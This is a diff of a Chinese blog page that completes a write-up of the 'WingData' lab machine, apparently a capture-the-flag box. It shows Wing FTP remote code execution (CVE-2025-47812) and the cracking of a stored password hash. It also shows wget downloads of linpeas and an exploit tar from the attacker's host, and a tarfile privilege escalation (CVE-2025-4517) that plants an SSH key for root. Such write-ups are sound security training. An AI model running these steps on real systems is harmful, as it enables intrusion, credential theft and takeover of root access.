@@ -19,12 +19,12 @@
   <meta name="author" content="Colourful">
   <meta name="keywords" content="">
   
-    <meta name="description" content="UserFlag先用nmap扫一下 1nmap -A 10.129.22.0  但不知道为什么扫了几次都没扫出来  加上-Pn应该也没扫全  直接尝试访问10.129.22.0 发现会跳转到http:&#x2F;&#x2F;wingdata.htb&#x2F;但重定向失败，就在&#x2F;etc&#x2F;hosts中添加  成功访问  尝试了扫目录，没扫到什么可用的，只有Client Prital可以跳转http:&#x2F;&#x2F;ftp.wingdata.">
+    <meta name="description" content="UserFlag CVE_2025_47812  先用nmap扫一下 1nmap -A 10.129.22.0  但不知道为什么扫了几次都没扫出来  加上-Pn应该也没扫全  直接尝试访问10.129.22.0 发现会跳转到http:&#x2F;&#x2F;wingdata.htb&#x2F;但重定向失败，就在&#x2F;etc&#x2F;hosts中添加  成功访问  尝试了扫目录，没扫到什么可用的，只有Client Prital可以跳转htt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WingData(working)">
+<meta property="og:title" content="WingData">
 <meta property="og:url" content="https://colourful228.github.io/2026/04/11/WingData/index.html">
 <meta property="og:site_name" content="Colourful">
-<meta property="og:description" content="UserFlag先用nmap扫一下 1nmap -A 10.129.22.0  但不知道为什么扫了几次都没扫出来  加上-Pn应该也没扫全  直接尝试访问10.129.22.0 发现会跳转到http:&#x2F;&#x2F;wingdata.htb&#x2F;但重定向失败，就在&#x2F;etc&#x2F;hosts中添加  成功访问  尝试了扫目录，没扫到什么可用的，只有Client Prital可以跳转http:&#x2F;&#x2F;ftp.wingdata.">
+<meta property="og:description" content="UserFlag CVE_2025_47812  先用nmap扫一下 1nmap -A 10.129.22.0  但不知道为什么扫了几次都没扫出来  加上-Pn应该也没扫全  直接尝试访问10.129.22.0 发现会跳转到http:&#x2F;&#x2F;wingdata.htb&#x2F;但重定向失败，就在&#x2F;etc&#x2F;hosts中添加  成功访问  尝试了扫目录，没扫到什么可用的，只有Client Prital可以跳转htt">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412004558095.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412004600272.png">
@@ -38,8 +38,23 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412004622228.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412004624947.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412004627564.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412184220895.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412184400555.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412185400645.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412185846020.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412190112767.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412190238019.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412191128811.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412191741981.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412191851410.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412192902121.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412193633405.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412193936373.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412194414009.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412194637850.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/11/WingData/image-20260412203746473.png">
 <meta property="article:published_time" content="2026-04-11T12:31:33.000Z">
-<meta property="article:modified_time" content="2026-04-11T16:46:41.048Z">
+<meta property="article:modified_time" content="2026-04-12T12:40:48.600Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -50,7 +65,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>WingData(working) - Colourful</title>
+  <title>WingData - Colourful</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -338,7 +353,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="WingData(working)"></span>
+            <span id="subtitle" data-typed-text="WingData"></span>
           
         </div>
 
@@ -366,7 +381,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          216 字
+          814 字
         
       </span>
     
@@ -377,7 +392,7 @@
         
         
         
-          2 分钟
+          7 分钟
         
       </span>
     
@@ -427,12 +442,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">WingData(working)</h1>
+            <h1 id="seo-header">WingData</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-04-12T00:46:41+08:00
+                    本文最后更新于 2026-04-12T20:40:48+08:00
                   
                   
 
@@ -442,7 +457,10 @@
             
               <div class="markdown-body">
                 
-                <h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><p>先用nmap扫一下</p>
+                <h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><blockquote>
+<p>CVE_2025_47812</p>
+</blockquote>
+<p>先用nmap扫一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.129.22.0<br></code></pre></td></tr></table></figure>
 
 <p>但不知道为什么扫了几次都没扫出来</p>
@@ -462,7 +480,7 @@
 <p><img src="/2026/04/11/WingData/image-20260412004610836.png" srcset="/img/loading.gif" lazyload alt="image-20260412004610836"></p>
 <p>看到有版本信息，去搜索相关的漏洞</p>
 <p><img src="/2026/04/11/WingData/image-20260412004616404.png" srcset="/img/loading.gif" lazyload alt="image-20260412004616404"></p>
-<p>找到了CVE_2025_47812<a target="_blank" rel="noopener" href="https://github.com/r0otk3r/CVE-2025-47812">https://github.com/r0otk3r/CVE-2025-47812</a></p>
+<p>找到了CVE_2025_47812：<a target="_blank" rel="noopener" href="https://github.com/r0otk3r/CVE-2025-47812">https://github.com/r0otk3r/CVE-2025-47812</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE_2025_47812.py -u <span class="hljs-string">&quot;http://ftp.wingdata.htb/&quot;</span> -c <span class="hljs-string">&quot;whoami&quot;</span> -U anonymous -P password<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2026/04/11/WingData/image-20260412004619351.png" srcset="/img/loading.gif" lazyload alt="image-20260412004619351"></p>
@@ -476,7 +494,78 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2026/04/11/WingData/image-20260412004627564.png" srcset="/img/loading.gif" lazyload alt="image-20260412004627564"></p>
-<p>查看ls &#x2F;home发现还有一个wacky</p>
+<p>查看ls &#x2F;home发现还有一个wacky，在&#x2F;opt&#x2F;wftpserver&#x2F;Data&#x2F;1&#x2F;users目录下可以获得该用户的凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /opt/wftpserver/Data/1/users<br><span class="hljs-built_in">ls</span> -la<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412184220895.png" srcset="/img/loading.gif" lazyload alt="image-20260412184220895"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /opt/wftpserver/Data/1/users/wacky.xml<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412184400555.png" srcset="/img/loading.gif" lazyload alt="image-20260412184400555"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">32940</span>defd<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>ef<span class="hljs-number">70</span>a<span class="hljs-number">2</span>dd<span class="hljs-number">44</span>a<span class="hljs-number">5301</span>ff<span class="hljs-number">984</span><span class="hljs-keyword">c</span><span class="hljs-number">4742</span>f<span class="hljs-number">0</span>baae<span class="hljs-number">76</span>ff<span class="hljs-number">5</span>b<span class="hljs-number">8783994</span>f<span class="hljs-number">8</span>a<span class="hljs-number">503</span>ca<br></code></pre></td></tr></table></figure>
+
+<p>是一个哈希密码</p>
+<p><img src="/2026/04/11/WingData/image-20260412185400645.png" srcset="/img/loading.gif" lazyload alt="image-20260412185400645"></p>
+<p>WingFTP的盐值是：WingFTP</p>
+<p>利用hashcat爆破</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">1410</span> <span class="hljs-number">32940</span>defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412185846020.png" srcset="/img/loading.gif" lazyload alt="image-20260412185846020"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">password:</span>!<span class="hljs-meta">#7Blushing^*Bride5</span><br></code></pre></td></tr></table></figure>
+
+<p>ssh连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh wacky@10.129.22.124<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412190112767.png" srcset="/img/loading.gif" lazyload alt="image-20260412190112767"></p>
+<p>看到user.txt</p>
+<p><img src="/2026/04/11/WingData/image-20260412190238019.png" srcset="/img/loading.gif" lazyload alt="image-20260412190238019"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">b1430ead83b391b4fbbfded012416dd2<br></code></pre></td></tr></table></figure>
+
+<h1 id="RootFlag"><a href="#RootFlag" class="headerlink" title="RootFlag"></a>RootFlag</h1><blockquote>
+<p>CVE-2025-4517</p>
+</blockquote>
+<p>先在kali上起一个服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:8080<br></code></pre></td></tr></table></figure>
+
+<p>将linpeas.sh上传到靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://10.10.17.116:8080/linpeas.sh<br><span class="hljs-built_in">chmod</span> +x linpeas.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412191128811.png" srcset="/img/loading.gif" lazyload alt="image-20260412191128811"></p>
+<p><img src="/2026/04/11/WingData/image-20260412191741981.png" srcset="/img/loading.gif" lazyload alt="image-20260412191741981"></p>
+<p>但是好像没有看到什么有用的饿信息，就想其他提权方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412191851410.png" srcset="/img/loading.gif" lazyload alt="image-20260412191851410"></p>
+<p>发现可以利用无密码提权滥用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> argparse<br><br>BACKUP_BASE_DIR = <span class="hljs-string">&quot;/opt/backup_clients/backups&quot;</span><br>STAGING_BASE = <span class="hljs-string">&quot;/opt/backup_clients/restored_backups&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_backup_name</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.fullmatch(<span class="hljs-string">r&quot;^backup_\d+\.tar$&quot;</span>, filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    client_id = filename.split(<span class="hljs-string">&#x27;_&#x27;</span>)[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">&#x27;.tar&#x27;</span>)<br>    <span class="hljs-keyword">return</span> client_id.isdigit() <span class="hljs-keyword">and</span> client_id != <span class="hljs-string">&quot;0&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_restore_tag</span>(<span class="hljs-params">tag</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(re.fullmatch(<span class="hljs-string">r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;</span>, tag))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&quot;Restore client configuration from a validated backup tarball.&quot;</span>,<br>        epilog=<span class="hljs-string">&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;</span><br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;--backup&quot;</span>,<br>        required=<span class="hljs-literal">True</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;</span><br>             <span class="hljs-string">&quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;</span><br>    )<br>    parser.add_argument(<br>        <span class="hljs-string">&quot;-r&quot;</span>, <span class="hljs-string">&quot;--restore-dir&quot;</span>,<br>        required=<span class="hljs-literal">True</span>,<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Staging directory name for the restore operation. &quot;</span><br>             <span class="hljs-string">&quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;</span><br>             <span class="hljs-string">&quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;</span><br>    )<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_backup_name(args.backup):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(backup_path):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Backup file not found: <span class="hljs-subst">&#123;backup_path&#125;</span>&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.restore_dir.startswith(<span class="hljs-string">&quot;restore_&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] --restore-dir must start with &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    tag = args.restore_dir[<span class="hljs-number">8</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tag:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] --restore-dir must include a non-empty tag after &#x27;restore_&#x27;&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_restore_tag(tag):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Backup: <span class="hljs-subst">&#123;args.backup&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Staging directory: <span class="hljs-subst">&#123;staging_dir&#125;</span>&quot;</span>)<br><br>    os.makedirs(staging_dir, exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(backup_path, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> tar:<br>            tar.extractall(path=staging_dir, <span class="hljs-built_in">filter</span>=<span class="hljs-string">&quot;data&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Extraction completed in <span class="hljs-subst">&#123;staging_dir&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> (tarfile.TarError, OSError, Exception) <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Error during extraction: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)<br>        sys.exit(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412192902121.png" srcset="/img/loading.gif" lazyload alt="image-20260412192902121"></p>
+<p>这里存在可利用漏洞，CVE-2025-4517</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/DesertDemons/CVE-2025-4138-4517-POC/blob/main/exploit.py">https://github.com/DesertDemons/CVE-2025-4138-4517-POC/blob/main/exploit.py</a></p>
+<p>获取ssh密钥对</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">ssh-keygen -<span class="hljs-built_in">t</span> <span class="hljs-symbol">ed25519</span> -f id_ed25519 -<span class="hljs-built_in">N</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412193633405.png" srcset="/img/loading.gif" lazyload alt="image-20260412193633405"></p>
+<p>生成tar包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py --tar-out backup_1002.tar --target /root/.ssh/authorized_keys --payload id_ed25519.pub --mode 0600<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412193936373.png" srcset="/img/loading.gif" lazyload alt="image-20260412193936373"></p>
+<p>先在本地起一个服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -S 0:8080<br></code></pre></td></tr></table></figure>
+
+<p>再利用wget将下载的tar文件传到靶机的&#x2F;opt&#x2F;backup_clients&#x2F;backups&#x2F;目录下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/opt/</span>backup_clients<span class="hljs-regexp">/backups/</span><br>wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">17.116</span>:<span class="hljs-number">8080</span>/backup_1002.tar<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412194414009.png" srcset="/img/loading.gif" lazyload alt="image-20260412194414009"></p>
+<p>执行命令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">b</span> backup_1001<span class="hljs-selector-class">.tar</span> -<span class="hljs-attribute">r</span> restore_evil<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412194637850.png" srcset="/img/loading.gif" lazyload alt="image-20260412194637850"></p>
+<p>然后就在自己的kali上进行ssh登录</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_ed25519 root<span class="hljs-keyword">@10</span>.129.22.124<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/11/WingData/image-20260412203746473.png" srcset="/img/loading.gif" lazyload alt="image-20260412203746473"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">d439443f341af9842b9020245bc2b1d8<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -529,7 +618,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>WingData(working)</div>
+      <div>WingData</div>
       <div>https://colourful228.github.io/2026/04/11/WingData/</div>
     </div>
     <div class="license-meta">
@@ -589,8 +678,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/04/10/Kobold/" title="Kobold(work)">
-                        <span class="hidden-mobile">Kobold(work)</span>
+                      <a href="/2026/04/10/Kobold/" title="Kobold">
+                        <span class="hidden-mobile">Kobold</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
